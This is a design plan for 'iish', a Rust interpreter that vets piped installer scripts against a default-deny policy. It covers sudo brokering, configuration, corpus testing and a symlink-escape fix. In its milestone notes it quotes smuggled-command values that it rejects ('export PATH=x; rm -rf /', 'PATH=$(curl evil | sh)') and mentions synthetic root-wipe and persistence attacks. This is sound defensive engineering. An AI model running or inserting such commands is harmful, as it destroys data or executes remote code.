# iish — plan

`iish` (installer-ish shell) is a safe drop-in target for the
`curl https://example.com/install.sh | sh` pattern. It parses the bash
script it is fed, but instead of handing commands to a real shell, it
evaluates each one against an installer safety policy and executes only
the operations an installer legitimately needs — natively, in Rust,
never by shelling out to bash.

Usage shape:

```
curl -fsSL https://example.com/install.sh | iish
iish install.sh
iish --dry-run install.sh   # show what would happen, execute nothing
```

## Core principle: default deny

`iish` is an allowlist interpreter, not a bash sandbox. Anything it
cannot parse, or parses but does not recognize as a safe installer
operation, is refused (individually skippable / fatal — TBD). There is
no "pass through to bash" escape hatch.

This is *why* `curl … | sh` is not a dead end: piping a downloaded
script into a shell is the whole thing iish exists to make safe, so
instead of refusing the pipe, iish runs the producer (`curl`), captures
the script, and interprets it *itself* as a sub-context — every
statement vetted under the same policy. That is recursion into iish, not
a pass-through to bash (there is no shell in the loop); it is the same
recursive transparency `sudo sh -c '…'` and command substitution already
have. A refusal inside the second stage aborts the run exactly as it
would at the top level; the second stage's own `exit` ends only the
sub-context (bash subshell semantics). Only a stdin-reading shell
(`sh`/`bash -s`) is handled this way; `sh -c '…'` and a shell mid-pipeline
stay refused.

## Safety policy (initial rules)

| Operation | Policy |
|---|---|
| Write/create file or directory | Allowed if the path doesn't already exist; **prompt** before overwriting anything pre-existing |
| Append to shell env files (`~/.bashrc`, `~/.zshrc`, `~/.profile`, …) | Allowed only for a restricted grammar: `PATH=` additions, `export VAR=...`, `source`/`.` of a file the script created |
| Delete file/dir | Allowed only for paths this script created earlier in the run |
| Network | HTTP(S) GET only, performed by iish itself (no arbitrary curl flags); no other protocols |
| chmod / chown | `chmod` allowed on files the script created; `chown` ⇒ ask |
| `cp` | Native, same rule as write/create above: new destination allowed, overwrite governed by `overwrite` — not the subprocess tier |
| Function definitions (`name() { ... }`) and calls, brace groups (`{ ...; }`), `set -e`/`-u`/`-x`/`-o <option>` | Allowed — a definition just registers the body (nothing runs until called); a call or brace group recurses into its statements against the live session; `set`'s flags are no-ops (iish's execution model already fails fast) |
| `if`/`elif`/`else`/`fi`, `case`/`esac`, `test`/`[ ]` | Allowed — the condition (or case value) is evaluated for real, with real side effects, before picking a branch; whatever's inside a chosen branch is then checked statement by statement like anything else. Only as safe as the branch it runs |
| `first && second \|\| third ...` (command lists) | Allowed — pipelines run left to right with real bash short-circuiting; only the *grammatically last* pipeline's real exit status can abort the run, matching bash's own `errexit` exemption for the rest of the list |
| Bare `VAR=value` assignment (no command word) | Allowed — recorded in the session's variable table for a later `$VAR`/`${VAR}` expansion to read back (falling back to the real process environment, then denying if still unset); no filesystem or process side effects. `VAR=value cmd` prefix assignment is not |
| sudo | Not a command — an **execution context**. See "Privilege: the sudo broker" below |
| Shells (`sh`/`bash`/`zsh`/`dash`/`ksh`), shell builtins (`cd`, `export`, `source`, `.`), pipelines, remaining control flow (`for`/`while`/`until`), `eval` | Denied — no config knob reopens these; see "Core principle" |
| Everything else — external binaries iish has no native implementation for (`tar`, `apt-get`, `systemctl`, `sudo <cmd>` pre-broker, …) | **ask** by default (the "subprocess" tier); allow/ask/deny, globally or per command, in config — see "Configuration" |

Policy verbs are **allow / ask / deny**. `ask` is load-bearing: the
corpus shows sudo (10/17), package managers, systemctl, and running a
just-downloaded second stage are too common to deny outright and too
consequential to allow silently (see `corpus/ANALYSIS.md`).

## Privilege: the sudo broker (decided)

`sudo <cmd>` is not allowed or denied as a unit. iish strips the
`sudo`, evaluates the inner command under the exact same policy, and —
if it passes — performs the operation through a privileged broker
instead of handing root a shell.

On the first operation needing root (elevation itself is an `ask`),
iish runs `sudo iish --broker` once, prompting on `/dev/tty`, and holds
a socketpair to it. The broker is not a shell: it accepts a closed enum
of structured requests — `CreateDir`, `WriteFile{path, bytes, mode}`,
`Chmod`, `Chown`, `Remove`, `Symlink`, `Stat`, `ExecArgv` — and nothing
else. Parsing, policy, and prompting stay in the unprivileged parent;
the broker executes only already-vetted operations. `sudo rm -rf /`
dies on the same ledger rule as unprivileged `rm`. No escalation
surface beyond the user's existing sudo rights.

How this maps onto real sudo usage (corpus/ANALYSIS.md §6):

1. **Root file ops** (most frequent: `sudo tee` of apt sources and
   systemd units, `sudo mkdir/chmod/chown/cp`) → iish's native tier,
   executed by the broker. Full mediation: create-only writes,
   overwrite prompts, ledger tracking.
2. **sudo bookkeeping** (`sudo -v`, `sudo -n -v`, existence probes) →
   broker authentication or no-ops.
3. **External root binaries** (`systemctl`, package managers,
   `gpg --import`) → still **ask**, but the broker execs a fixed,
   fully-expanded argv with a sanitized environment: the user confirms
   exactly what runs, with no shell in between.

`sudo sh -c '…'` (docker/k3s pattern): the inner string is fed back
through iish's own parser and policy — recursively transparent.

Caveats accepted with the design:
- Restrictive sudoers (user may run only specific commands) can't
  launch the broker → degrade to per-command real sudo with fixed
  argv, losing native mediation but keeping argv transparency.
- Existence/overwrite checks for root-only-readable paths must happen
  broker-side (`Stat`), not in the unprivileged parent.

## Configuration (done — milestone 5)

Layered policy, later layers win:

1. Built-in defaults (the table above; unlisted subprocesses ⇒ ask).
2. User config file (`~/.config/iish/config.toml`, or `--config path`).
3. Command-line overrides.

```toml
[defaults]
subprocess = "ask"        # unlisted external commands: allow|ask|deny
self-call = "allow"       # calling a binary installed by this run
overwrite = "ask"         # writing over pre-existing files
env-file-append = "ask"   # rc/profile appends (restricted grammar)
run-created = "ask"       # executing files the script created
network = "get-only"      # get-only|deny
elevate = "ask"           # first use of the sudo broker: allow|ask|deny

[commands]                # per-command overrides
"apt-get" = "ask"
systemctl = "deny"
uname = "allow"
```

`subprocess`, `self-call`, `overwrite`, `network`, `run-created`, `env-file-append`,
and `[commands]` are live: they change what policy.rs's evaluator does
today, including a **subprocess tier** for any external binary iish has
no native implementation for (`tar`, `apt-get`, `sudo <cmd>`
pre-broker, … — `cp` moved out of this tier into a native
implementation) — the literal, already-parsed argv is exec'd directly,
never through a shell, once allowed or confirmed — and the restricted
`>>` env-file append grammar (milestone 6). Shells and shell builtins
(`cd`, `export`, `source`, `.`) stay hard-denied regardless of config —
see the "Core principle" above. `elevate` parses successfully (so this
file round-trips) but isn't consulted until the sudo broker (milestone
4b) exists.

CLI: `iish --allow sudo --deny curl --subprocess=deny --overwrite=allow
--self-call=ask --network=deny --config path.toml --no-config --dry-run …`, plus
`--yes`/`--no` to resolve every `ask` non-interactively.

## Open questions

- Second-stage binaries (`ask` with provenance shown is the default;
  is there a better answer than ask?).
- **Sandboxing** downloaded second stages / the whole run: investigate
  Landlock + seccomp (Linux) and Seatbelt (macOS) — explicitly *not*
  first-iteration scope.
- Prompting must go through `/dev/tty` (stdin is the script); same for
  the script's own `read` statements.

## Architecture

```
src/
  main.rs      CLI entry: read script (stdin or file), interpret
  parser.rs    Thin wrapper around **brush-parser** (decided — parses
               17/17 corpus scripts vs yash-syntax's 13/17, MIT vs
               GPL; see docs/parser-eval.md): hands it the script and
               returns its AST (`parser::ast`, re-exported), or a
               top-level syntax error. Also the home of word expansion,
               run against an `ExpandCtx` (the live session plus a
               `Substituter` callback the runner supplies): `$VAR`/
               `${VAR}` and the common `${VAR:-x}`/`${VAR:=x}`/`${VAR:+x}`/
               `${#VAR}`/`${VAR#pat}`/`${VAR%pat}` operators, the special
               and positional parameters (`$?`, `$#`, `$@`, `$*`, `$0`,
               `$1`, ...), tilde, and `$(command)`/backtick substitution
               (run through the full runner, output captured) all expand;
               a `word_fields` entry point does bash's field splitting so
               `"$@"` forwards argument boundaries and a lone unquoted
               `$VAR`/`$(cmd)` splits on whitespace. Names resolve through
               the session's call frames and globals, then the real
               process environment, then a small shell-identity table
               (`BASH_VERSION`, `POSIXLY_CORRECT`); an unset name expands
               to empty by default (bash's behavior) and is refused only
               after the script's own `set -u`. Array expansion, ANSI-C
               quoting, and unquoted globbing are still rejected.
  policy.rs    The evaluator: walks `parser::ast` node by node and
               produces a `Verdict` per top-level statement — `Allow`/
               `Prompt`/`Deny` for a single compiled `Action`, or one of
               the deferred forms the runner must interpret against the
               live session: `Group` (brace group or matched `case` arm),
               `Call` (a function call, bracketed in a frame so `$1`/`$@`/
               `local`/`return` work), `If`, `For`, `While` (with an
               iteration ceiling), `AndOrList` (`&&`/`||`, short-circuited
               like bash, only the grammatically-last pipeline's status
               tripping abort-on-failure), `Not` (`! pipeline`, exempt from
               errexit), `Pipe` (a real multi-stage pipeline, stages run
               sequentially with each one's stdout buffered as the next's
               stdin), `PipeToShell` (`curl … | sh`: run the producer,
               capture its output, and interpret that script through
               iish itself — the sub-iish recursion of the Core
               principle), and `ControlFlow` (`return`/`exit`/`break`/
               `continue`, which the runner unwinds to the right
               boundary). `test`/`[ ]` and `case` matching are evaluated
               natively with no side effects. The native builtins live
               here too — `local`, `shift`, `unset`, `command -v`/`type`,
               `cd`, `read`/`true` from `< /dev/tty`, `set -u` as a real
               toggle — alongside `cat << EOF` here-doc banners,
               `read -r NAME << EOF`, and the `> /dev/null`/`2>&1`/`>&2`
               redirect shapes. Shells and the
               reopen-a-shell builtins (`eval`, `exec`, `source`) stay
               hard-denied. Anything still unimplemented (background jobs
               `&`, `VAR=value cmd` prefix assignment, most redirect
               targets, array/ANSI-C/glob expansion, ...) is denied here —
               the Unsupported→deny posture lives in the evaluator, not
               the parser.
  config.rs    Layered policy (milestone 5): builtin `Config::default()`
               ← config file (TOML via serde) ← CLI overrides. Exposes
               `Verb` (allow/ask/deny) and `NetworkPolicy` per PLAN's
               sketch below; unconsumed knobs (`env-file-append`,
               `elevate`) still parse, for forward compatibility with
               the documented schema.
  exec.rs      Native implementations of allowed operations. The policy
               compiles each allowed statement into a closed `Action`
               enum (Print, MkDir, Remove, Chmod, Copy, Fetch,
               AppendFile, Sha256Sum, Sha256Check, Subprocess,
               DefineFunction, Test, Assign, DeclareLocal, Shift, Unset,
               SetNounset, ProbeRead, ChangeDir, ReadLine, CommandLookup,
               Noop); exec runs actions in Rust — echo/printf rendering
               (with `%b`/octal escapes), dir creation, ledger-checked
               rm/chmod, native `cp` (governed by `overwrite`, like
               `curl -o`/`wget -O`), GET fetches via an in-process,
               timeout- and redirect-bounded HTTP client (ureq) that
               refuses to downgrade an https:// fetch to plaintext on
               redirect, restricted-grammar rc-file appends, native
               SHA-256 compute/verify, direct fork/exec (never a shell)
               of the subprocess tier's literal argv — with the
               statement's own stdout/stderr redirects and, in a
               pipeline, a fed-in stdin — plus the frame/variable/
               function bookkeeping the builtins need. Output routing
               goes through an `Out` handle so the *script's* stdout can
               be captured into a buffer inside a `$(command)`
               substitution instead of reaching the terminal. A second
               entry point, `execute_returning_status`, reports a
               `Subprocess`/`Test`/`CommandLookup`/`ReadLine` outcome as
               a `bool` instead of an `Err`, for main.rs's
               `if`/`while`/`until` condition and `&&`/`||` evaluation;
               `execute_piped` runs one pipeline stage with a fed-in
               stdin.
  prompt.rs    /dev/tty confirmation for `ask` verdicts (stdin carries
               the script); `--yes`/`--no` resolve asks without a tty
  broker.rs    (planned) privileged worker: `sudo iish --broker`,
               closed enum of operations over a socketpair (see
               "Privilege: the sudo broker")
  state.rs     Session state: the ledger of paths created during this
               run — the source of truth for "may delete / may chmod /
               may run" — plus the function table, global variables, the
               `set -u` flag, and a stack of call frames (each carrying a
               function call's positional parameters and its `local`
               declarations, so `$1`/`$@`/`$#` and dynamically-scoped
               `local` resolve correctly).
```

Execution model: **interleaved** (decided). Installers branch on
runtime probes (`uname`, `command -v`) and later stages depend on
earlier side effects, so a static plan-then-run split can't work.
iish walks the AST, evaluating policy at each command execution.
`--dry-run` remains as a best-effort static report.

## Corpus

`corpus/fetch.sh` pulls 17 real installer scripts (rustup, homebrew,
nvm, docker, k3s, nix, …) into `corpus/cache/`, which is git-tracked
(see `corpus/cache/README.md`) so sessions don't need network access
to use it; run `corpus/fetch.sh --force` to refresh it from upstream.
Findings that drive the design are in `corpus/ANALYSIS.md`. The cache
doubles as the integration-test corpus later.

## Milestones

1. ~~**Scaffold**~~ — cargo project, module skeleton, minimal parser,
   policy stub, report mode. *(done)*
2. ~~**Corpus**~~ — fetch + empirical analysis of real installers.
   *(done — see corpus/ANALYSIS.md)*
3. ~~**Real parser**~~ — adopted brush-parser (decided,
   docs/parser-eval.md); the evaluator walks its AST directly, denying
   every construct (pipelines, control flow, functions, redirects,
   expansions, ...) it doesn't yet implement. Unsupported→deny posture
   preserved, now enforced in the evaluator rather than the tokenizer.
   *(done)*
4. ~~**Execution + ledger**~~ — interleaved native execution of the
   allowed tiers (echo/printf, mkdir, ledger-checked rm and chmod,
   curl/wget GETs performed by iish's own HTTP client with
   prompt-before-overwrite), session ledger wired through execution,
   `/dev/tty` prompting with `--yes`/`--no` overrides, and `--dry-run`
   keeping the static report (with simulated ledger). *(done)*
   - 4b. **Sudo broker** — the privileged worker described above; not
     started.
5. ~~**Configuration**~~ — config-file policy + CLI overrides (see
   above); a new **subprocess tier** governed by it (allow/ask/deny,
   globally or per command) for external binaries iish has no native
   implementation for, exec'd directly and never through a shell.
   Built-in default for that tier flipped from a hard deny to `ask`,
   matching PLAN's "unlisted subprocesses ⇒ ask". Shells and shell
   builtins remain hard-denied, not configurable. *(done)*
6. ~~**Harden**~~ — a restricted `>>` redirect grammar for `echo`/`printf`
   onto recognized rc/profile files (`export VAR=...`, `PATH=...`,
   `source`/`.` of a created file — PLAN's env-file append row, governed
   by `env-file-append`); GET-only HTTP client hardening (fixed
   timeouts, a bounded redirect count, `https_only` so a redirect can't
   downgrade an `https://` fetch to plaintext); and native
   `sha256sum`/`sha256sum -c` checksum verification, restricted like
   `rm`/`chmod` to paths this run created. All other redirect shapes
   remain denied. *(done)*
7. **Corpus as test suite** — the long-term goal is still "iish runs
   the majority of the corpus to completion (with expected asks)".
   Function definitions and calls, brace groups, and the `set` builtin
   (`-e`/`-u`/`-x`/`-o <option>` flags — no-ops, since iish's
   fail-fast-on-any-error execution model already behaves as if
   `errexit`/`nounset` were always on) are implemented; `cp` is native
   too (PLAN's filesystem-mutation tier: create-only, overwrite governed
   by `overwrite`, no config knob needed to reach it — unlike the
   subprocess tier). `if`/`elif`/`else`/`fi` and `case`/`esac` are
   implemented, along with a native `test`/`[` (the common unary and
   binary operators, including `-t` for tty checks, plus `!` negation).
   `&&`/`||` command lists are implemented too: the runner walks a
   chain's pipelines left to right, short-circuiting exactly like bash,
   and only the *grammatically last* pipeline's real exit status can
   trip iish's abort-on-failure posture (so `false && echo hi` survives
   — `echo hi` never ran — the same way it survives real bash's
   `errexit`, while `true && false` does not). Bare `VAR=value`
   assignment (no command word; multiple on one line) is implemented
   too, tracked per-run in `state.rs`'s `Session`, together with plain
   `$VAR`/`${VAR}` parameter expansion reading it back — falling back to
   the real process environment (same fallback `~` already got for
   `$HOME`) when a name was never assigned, and denying an expansion of
   a name that's neither. Between them, a condition, case value, or
   assigned value made only of literal text, `$VAR`/`${VAR}` reads, and
   `&&`/`||`/`test` now resolves completely — enough for real per-script
   progress (see the updated pins in `scripts/verify-installers.sh`) —
   `2> /dev/null` stderr redirects are implemented too (discarding
   stderr writes nothing anywhere, so there is nothing to vet: the
   subprocess tier nulls the child's stderr, native actions never
   write the script's output there anyway) — though most real
   installers still deny somewhere on `VAR=value cmd` prefix
   assignment or a redirect shape beyond the discard/append set.
   Command substitution (`$(cmd)`/backticks), the special and positional
   parameters (`$?`, `$#`, `$@`, `$*`, `$1`, ...), the common
   parameter-expansion operators (`${VAR:-default}`, `${VAR:=x}`,
   `${VAR:+x}`, `${#VAR}`, and the `${VAR#pat}`/`${VAR%pat}` prefix/suffix
   removals), `for`/`while`/`until` loops (with `break`/`continue` and an
   iteration ceiling), real multi-stage pipelines (`uname | tr ...`, run
   sequentially with each stage's stdout buffered as the next stage's
   stdin), `! pipeline` negation, and the builtins installers reach for
   (`local`, `return`/`exit`/`shift`/`unset`, `command -v`/`type`,
   native `cd`, and `read`/`true` from `< /dev/tty`) are all implemented
   now, along with here-documents (`cat << EOF` banners and
   `read -r NAME << EOF` input), `> /dev/null`/`2>&1`/`>&2` redirects,
   and the `%b`/octal `printf` escapes. `set -u`
   is honored as a real toggle (unset expands to empty by default, bash's
   behavior, and is refused only after the script itself opts in).
   `curl … | sh` is handled as a sub-context ("sub-iish", see the Core
   principle above) rather than refused, so even atuin's pipe-into-a-shell
   bootstrap runs its producer and would interpret the fetched second
   stage. With all of that in place every one of the seven curated corpus
   installers now runs its *entire* platform-detection and setup logic
   and stops only at a genuine external boundary — the network (downloads,
   under `--network none` — including the second-stage fetch atuin's
   `curl … | sh` now reaches), an interactive `/dev/tty` prompt, or the
   one still-unimplemented construct (background jobs, `&`, which nvm uses
   to parallelize its downloads).
   `scripts/verify-installers.sh` (Docker-isolated,
   network-disabled, runnable in CI or by hand — see
   `.github/workflows/installer-verify.yml`) runs a curated,
   user-space-only subset of the corpus through the real binary and
   pins *where* each stops, as a regression guard: the pin breaking means
   either a regression or genuine further progress, either way worth a
   human's attention. Stopping at the pinned boundary is reported as
   **XFAIL** — an expected, known-tracked non-completion that does not
   fail the suite — so the gate is green-by-default while honestly never
   calling a non-completion a pass; only an *unexpected* outcome (a pin
   breaking, a completed install whose program isn't usable, a broken
   self-check or adversarial case) fails it. The completed-install path
   is exercised for real today by the harness self-check (a synthetic
   offline installer that runs to completion and whose installed program
   is then verified) and by an end-to-end `tests/cli.rs` case that drives
   a realistic download-based installer — functions, `case` detection,
   `local`, a `for` loop, a real (local-HTTP) download, `chmod +x`, and a
   PATH export — all the way to a working program. If/when a real corpus
   script ever runs to completion (e.g. once the harness grows a local
   payload mirror for the offline-completable ones), the same paired
   verify command decides pass/fail for real. The same script
   also runs a small adversarial corpus (`corpus/adversarial/`) of
   synthetic installers that attempt real attacks — root wipe, rc-file
   persistence injection, writing outside the env-file grammar, and a
   symlink-escape of `rm`/`chmod` outside anything the run owns.
   Writing that last pair caught a real vulnerability: `Session::owns`
   (state.rs) is a lexical prefix match with no idea a path component
   could be a symlink; `exec.rs`'s `assert_no_symlink_escape` now
   refuses to operate through one for every native filesystem action
   that *mutates or reads a policy-restricted path* (`mkdir`, `rm`,
   `chmod`, fetch-to-file, env-file append, `sha256sum`, and `cp`'s
   destination). `cp`'s *source* deliberately follows symlinks like
   real `cp`: the policy places no restriction on what a source may
   name (copying only reads), so a symlink there guards nothing — and
   refusing it broke `cp /bin/true ...` on merged-usr systems where
   `/bin` itself is a symlink to `usr/bin`. The env-file append grammar
   also rejects a command smuggled into an assignment value (`export
   PATH=x; rm -rf /`, `PATH=$(curl evil | sh)`): the value must be a
   single word, since a later shell *sources* the rc file. *(in progress
   — every curated corpus installer now runs its full logic and stops only
   at an external boundary or background jobs; the completed-install path
   is proven by the self-check and an end-to-end download-installer test)*
8. **Sandboxing investigation** — Landlock/seccomp/Seatbelt for second
   stages (post-first-iteration).
